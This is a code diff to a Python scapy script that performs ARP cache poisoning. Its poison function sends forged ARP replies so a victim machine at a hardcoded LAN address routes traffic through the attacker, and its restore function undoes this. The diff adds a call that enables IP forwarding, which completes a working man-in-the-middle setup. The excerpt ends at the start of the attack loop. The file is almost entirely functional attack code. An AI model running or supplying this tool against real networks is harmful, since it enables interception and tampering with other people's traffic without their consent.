@@ -1,5 +1,6 @@
 from scapy.all import *
 import time
+import ip_forwarding
 
 def poison(routerIP, victimIP, routerMAC, victimMAC):
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
@@ -10,6 +11,8 @@ def poison(routerIP, victimIP, routerMAC, victimMAC):
 def restore(routerIP, victimIP, routerMAC, victimMAC):
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+
+ip_forwarding.enable()
 
 while True:
     victimIP="192.168.1.2"
